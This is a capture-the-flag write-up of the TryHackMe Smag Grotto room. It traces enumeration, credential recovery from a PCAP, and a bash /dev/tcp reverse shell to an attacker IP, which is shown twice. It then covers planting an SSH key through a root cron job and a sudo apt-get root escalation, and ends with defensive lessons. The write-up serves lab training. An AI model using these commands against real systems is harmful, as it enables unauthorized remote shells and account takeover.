Written By Aryan Giri

# Smag Grotto: TryHackMe Writeup

> Follow the yellow brick road.

**Room:** Smag Grotto
**Platform:** TryHackMe
**Target IP:** `10.49.177.225`

This walkthrough covers the complete attack path used to compromise the Smag Grotto machine, starting with reconnaissance and web enumeration, analyzing a PCAP file for credentials, gaining command execution, abusing a writable SSH key backup through cron, and finally escalating privileges to root through an allowed `apt-get` command.

## Initial Reconnaissance

The first step is to scan the target and identify the services running on it.

```bash
nmap -sV -sC 10.49.177.225
```

The scan reveals two important open services:

* HTTP
* SSH

`-sV` performs service and version detection, while `-sC` runs Nmap's default NSE scripts. This gives us a quick starting point without blindly throwing random tools at the machine, because apparently enumeration is still more effective than hoping the server feels generous.

<img width="1004" height="569" alt="Screenshot 2026-09-14 160524" src="https://github.com/user-attachments/assets/3c1b4447-5f68-4fc0-8e50-9e3e86e627fd" />


---

# Exploring the Web Application

Let's open the target website:

```text
http://10.49.177.225
```

The page displays:

> Welcome to Smag!

The website also indicates that the page is still under development.

<img width="999" height="445" alt="Screenshot 2026-09-14 160628" src="https://github.com/user-attachments/assets/5e25faa8-46d2-437e-a88f-c34f491b85c8" />


At this stage, I checked the page source and inspected network requests, but nothing particularly interesting appeared.

Since the visible application did not reveal anything useful, the next step was directory enumeration.

## Directory Brute Forcing

Using Gobuster with a SecLists wordlist:

```bash
gobuster dir -u http://10.49.177.225/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

The enumeration reveals an interesting directory:

```text
/mail
```

<img width="830" height="480" alt="Screenshot 2026-09-14 160648" src="https://github.com/user-attachments/assets/cc343586-ee21-43cd-8c0b-896f0120c368" />


Opening `/mail` reveals a conversation containing an attached network log file.

The attachment appears to be a PCAP file, so we download it for further analysis.

---

# Analyzing the Network Capture

The downloaded PCAP file can be opened using Wireshark:

```bash
wireshark dHJhY2Uy.pcap
```

<img width="1919" height="997" alt="Screenshot 2026-09-14 160952" src="https://github.com/user-attachments/assets/772b1f30-e954-4d28-bbe1-cd4ceb80d578" />

The capture contains only a small number of packets, so filtering is not really necessary.

While inspecting the packets, packet 4 contains an HTTP request related to a login form.

<img width="1749" height="292" alt="Screenshot 2026-09-14 161008" src="https://github.com/user-attachments/assets/484bc584-6716-42a5-aedf-1d5a799cb262" />


Let's inspect it more closely.

<img width="958" height="393" alt="Screenshot 2026-09-14 161024" src="https://github.com/user-attachments/assets/affa1065-7a00-46d3-b7ab-e4d0408e3638" />



The network traffic reveals the following application URL:

```text
http://development.smag.thm/login.php
```

The captured request also contains login credentials.

The credentials are intentionally masked in the screenshots to follow TryHackMe rules.

This is a useful reminder that network captures can accidentally expose sensitive information when applications transmit credentials or other authentication data insecurely.

---

# Adding the Development Host

Since the application uses a hostname instead of directly using the target IP, we need to map it locally.

Edit the hosts file:

```bash
sudo nano /etc/hosts
```

Add:

```text
10.49.177.225 development.smag.thm
```

<img width="804" height="425" alt="Screenshot 2026-09-14 161728" src="https://github.com/user-attachments/assets/1645a596-6dcf-435c-91a7-5863093621bc" />


Now open:

```text
http://development.smag.thm
```

<img width="941" height="395" alt="Screenshot 2026-09-14 161855" src="https://github.com/user-attachments/assets/ac659a7c-fe31-42ac-a0c9-47d407c58475" />


Then navigate to:

```text
http://development.smag.thm/login.php
```

Using the credentials recovered from the PCAP file, we can authenticate successfully.

<img width="1144" height="617" alt="image" src="https://github.com/user-attachments/assets/9f7c8a15-5ba5-4c6a-846c-e6421c83adb5" />


---

# Command Execution

After logging in, the application provides a command execution page.

However, command output is not displayed directly in the browser.

Instead of relying on visible output, we can attempt to obtain an interactive shell.

## Starting a Netcat Listener

Before triggering the reverse shell, start a listener on the attacker machine:

```bash
nc -lvnp 4444
```

The flags mean:

* `-l` listens for incoming connections
* `-v` enables verbose output
* `-n` prevents DNS resolution
* `-p 4444` specifies the listening port

Now the attacker machine is waiting for the target to connect back.

---

# Getting a Reverse Shell

Using the command execution functionality, execute:

```bash
bash -c 'exec bash -i &>/dev/tcp/192.168.134.12/4444 <&1'
```

Replace the IP address with your own attacker machine or VPN interface IP.

<img width="1018" height="523" alt="Screenshot 2026-09-14 162227" src="https://github.com/user-attachments/assets/dd4319df-30af-45f0-a739-8a5d1f9aeb52" />


Once the command executes successfully, the Netcat listener receives a connection.

<img width="811" height="287" alt="Screenshot 2026-09-14 162239" src="https://github.com/user-attachments/assets/2d3197c8-6aec-45a3-b3ef-31228380a79f" />


We now have a shell on the target machine.

---

# Enumerating the Target

Let's inspect the `/home` directory:

```bash
ls -la /home
```

We find a user named:

```text
jake
```

There is also a `user.txt` flag, but the current user does not have permission to read it.

<img width="486" height="316" alt="Screenshot 2026-09-14 163713" src="https://github.com/user-attachments/assets/59d749f0-d148-4206-990e-0c7aaf38f7dd" />


This means we need to move laterally or escalate privileges to the `jake` user.

---

# Investigating Cron Jobs

After checking common privilege escalation techniques, an interesting entry appears in the system crontab.

Run:

```bash
cat /etc/crontab
```

<img width="1159" height="478" alt="Screenshot 2026-09-14 162423" src="https://github.com/user-attachments/assets/dcffca54-5914-4ecd-b6ff-4d4f51385567" />


The important line is:

```text
*  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
```

This cron job runs every minute as `root`.

It copies:

```text
/opt/.backups/jake_id_rsa.pub.backup
```

into:

```text
/home/jake/.ssh/authorized_keys
```

This is the key vulnerability in the privilege escalation chain.

If we can modify the backup file, we can replace Jake's authorized SSH key with our own public key.

The cron job will then automatically install our key into Jake's account.

---

# Generating an SSH Key

On the attacker machine, generate an RSA key pair if you do not already have one:

```bash
ssh-keygen -t rsa
```

<img width="1003" height="579" alt="Screenshot 2026-09-14 163303" src="https://github.com/user-attachments/assets/21ea4b98-6af5-49a0-9fd9-e509f7d8238e" />

This creates a private key and a corresponding public key.

The public key can be viewed using:

```bash
ssh-keygen -y -f ~/.ssh/id_rsa
```

<img width="815" height="237" alt="Screenshot 2026-09-14 163350" src="https://github.com/user-attachments/assets/8d4d3b7c-932f-42c0-b875-23707edc4882" />


Copy the complete public key output.

---

# Replacing Jake's Authorized Key Backup

Back on the target shell, write your public key into the backup file:

```bash
echo "YOUR_PUBLIC_RSA_KEY" > /opt/.backups/jake_id_rsa.pub.backup
```

<img width="814" height="226" alt="Screenshot 2026-09-14 163542" src="https://github.com/user-attachments/assets/06d633df-a40c-4fe0-8a21-b20331098898" />


To confirm that the key was written successfully:

```bash
cat /opt/.backups/jake_id_rsa.pub.backup
```

<img width="811" height="223" alt="Screenshot 2026-09-14 163554" src="https://github.com/user-attachments/assets/e1248a1d-ba5d-434d-9f76-aa5b339d2ff2" />


Now wait for the cron job to execute.

Within approximately one minute, the cron job copies our public key into:

```text
/home/jake/.ssh/authorized_keys
```

We can now authenticate as Jake over SSH.

---

# Logging in as Jake

From the attacker machine:

```bash
ssh jake@10.49.177.225
```

<img width="814" height="491" alt="Screenshot 2026-09-14 163801" src="https://github.com/user-attachments/assets/d67cceb9-0203-4594-8a07-6d5e5bd2ba10" />


We now have access as the `jake` user.

The user flag can now be read:

```bash
cat ~/user.txt
```

<img width="467" height="131" alt="Screenshot 2026-09-14 163833" src="https://github.com/user-attachments/assets/9e5d6365-9c17-473b-8cc0-6138a8fe0326" />


The flag is masked in the screenshot.

---

# Privilege Escalation to Root

The next step is checking which commands Jake is allowed to execute with elevated privileges.

Run:

```bash
sudo -l
```

<img width="807" height="225" alt="Screenshot 2026-09-14 163947" src="https://github.com/user-attachments/assets/d42b2e5a-25ea-407b-8d36-45a933ec9e61" />


The output shows that Jake can execute:

```text
/usr/bin/apt-get
```

as root without providing a password:

```text
(ALL : ALL) NOPASSWD: /usr/bin/apt-get
```

This is a dangerous sudo configuration because `apt-get` can be abused to execute commands with root privileges.

A useful reference for known Unix binary privilege escalation techniques is:

[GTFOBins APT-GET techniques](https://gtfobins.github.io/gtfobins/apt-get/?utm_source=chatgpt.com)

The following command can trigger a shell through an APT update hook:

```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

This results in a root shell.

We can confirm our privileges with:

```bash
whoami
```

Expected output:

```text
root
```

Now read the root flag:

```bash
cat /root/root.txt
```

<img width="779" height="194" alt="Screenshot 2026-09-14 164200" src="https://github.com/user-attachments/assets/b2c14019-6bcd-4344-bdef-bf24e9dd912e" />


Room completed.

---

# Attack Path Summary

The complete attack chain looks like this:

```text
Nmap Scan
    |
    v
HTTP Enumeration
    |
    v
Gobuster Directory Discovery
    |
    v
/mail Found
    |
    v
PCAP Download
    |
    v
Wireshark Analysis
    |
    v
Credentials Recovered
    |
    v
Login to development.smag.thm
    |
    v
Command Execution
    |
    v
Reverse Shell
    |
    v
Cron Job Enumeration
    |
    v
Writable SSH Key Backup
    |
    v
Inject Attacker Public Key
    |
    v
SSH Access as Jake
    |
    v
sudo -l
    |
    v
apt-get Allowed as Root
    |
    v
Root Shell
```

# Security Lessons

## 1. Directory Enumeration Still Matters

The main website did not expose anything immediately useful.

However, directory brute forcing discovered `/mail`, which ultimately contained the PCAP file that started the entire attack chain.

Hidden content is not protected content.

Security through obscurity remains one of humanity's more optimistic engineering strategies.

Sensitive directories should require proper authentication and authorization rather than simply relying on users not discovering them.

---

## 2. Network Traffic Can Leak Credentials

The PCAP file contained authentication information.

In real environments, insecure network traffic can expose:

* Usernames
* Passwords
* Session cookies
* API tokens
* Internal application URLs
* Authentication requests

Sensitive traffic should be protected with properly configured encryption such as HTTPS/TLS.

---

## 3. Development Systems Should Not Be Exposed Carelessly

The hostname:

```text
development.smag.thm
```

represents a development environment.

Development applications often contain:

* Debug functionality
* Test credentials
* Command execution features
* Incomplete authentication
* Experimental code

A development environment exposed to attackers can become the weakest point in an otherwise secure infrastructure.

---

## 4. Command Execution Is Extremely Dangerous

The authenticated application provided command execution capability.

Any feature that passes user-controlled input to the operating system should be treated as highly dangerous.

If arbitrary commands can be executed, an attacker may gain:

* File access
* System information
* Credential access
* Network access
* Reverse shells
* Lateral movement opportunities

Command execution functionality should be avoided unless absolutely necessary and should never directly pass user input to a shell.

---

## 5. Cron Jobs Can Create Privilege Escalation Paths

The cron job itself was running as root:

```text
* * * * * root ...
```

The problem was not merely that cron existed.

The problem was that a root-owned automated process trusted a file that an attacker could modify.

This created a classic privilege escalation chain:

```text
Low-privileged write access
+
Root automated process
=
Privilege escalation opportunity
```

Files consumed by privileged processes should have strict ownership and permissions.

---

## 6. SSH Authorized Keys Are Powerful Authentication Mechanisms

SSH public key authentication is normally very secure.

However, security depends on controlling who can modify:

```text
~/.ssh/authorized_keys
```

If an attacker can cause their own public key to be added to a user's authorized keys, they effectively gain persistent access to that account.

Authorized key files and any automated processes that generate them should be protected carefully.

---

## 7. Dangerous Sudo Rules Can Lead Directly to Root

The following rule was the final escalation point:

```text
NOPASSWD: /usr/bin/apt-get
```

Administrators sometimes allow specific binaries through `sudo` without realizing those binaries can execute additional programs.

Before allowing any binary through sudo, administrators should understand whether it supports:

* Shell execution
* Hooks
* Plugins
* Configuration injection
* Script execution
* External command execution

Tools documented on resources such as GTFOBins demonstrate why seemingly harmless binaries can become privilege escalation vectors.

---

# Real-World Perspective

Smag Grotto demonstrates an important lesson about attack chains.

There was no single magical vulnerability that immediately gave root access.

Instead, the compromise involved multiple weaknesses:

1. Discovering hidden content
2. Recovering information from network traffic
3. Accessing a development application
4. Exploiting command execution
5. Enumerating scheduled tasks
6. Abusing SSH key management
7. Identifying a dangerous sudo permission
8. Escalating to root

This is much closer to how many real penetration tests work.

Attackers do not always need one catastrophic vulnerability.

Several smaller mistakes can connect together into a complete compromise.

The strongest habit during CTFs and real-world pentesting is therefore simple:

```text
Enumerate everything.
Understand what you find.
Follow the trust boundaries.
Look for where low privilege interacts with high privilege.
```

That interaction is often where the interesting stuff lives.

## Tools Used

* Nmap
* Gobuster
* SecLists
* Wireshark
* Netcat
* OpenSSH
* GTFOBins

## Commands Used

```bash
nmap -sV -sC 10.49.177.225
```

```bash
gobuster dir -u http://10.49.177.225/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

```bash
wireshark dHJhY2Uy.pcap
```

```bash
sudo nano /etc/hosts
```

```bash
nc -lvnp 4444
```

```bash
bash -c 'exec bash -i &>/dev/tcp/192.168.134.12/4444 <&1'
```

```bash
cat /etc/crontab
```

```bash
ssh-keygen -t rsa
```

```bash
ssh-keygen -y -f ~/.ssh/id_rsa
```

```bash
echo "YOUR_PUBLIC_RSA_KEY" > /opt/.backups/jake_id_rsa.pub.backup
```

```bash
ssh jake@10.49.177.225
```

```bash
sudo -l
```

```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

```bash
cat /root/root.txt
```

# Conclusion

Smag Grotto is a solid example of a chained Linux penetration testing scenario.

The path from initial reconnaissance to root involved web enumeration, PCAP analysis, credential discovery, command execution, cron job abuse, SSH key persistence, and sudo privilege escalation.

The biggest takeaway is that enumeration drives exploitation.

Every stage of this machine provided information that made the next stage possible. Missing the `/mail` directory, ignoring the PCAP, skipping cron enumeration, or failing to inspect `sudo -l` could have stopped the attack path completely.

In CTFs, the flags are the objective.

In real environments, the same chain would represent a complete compromise of the system.
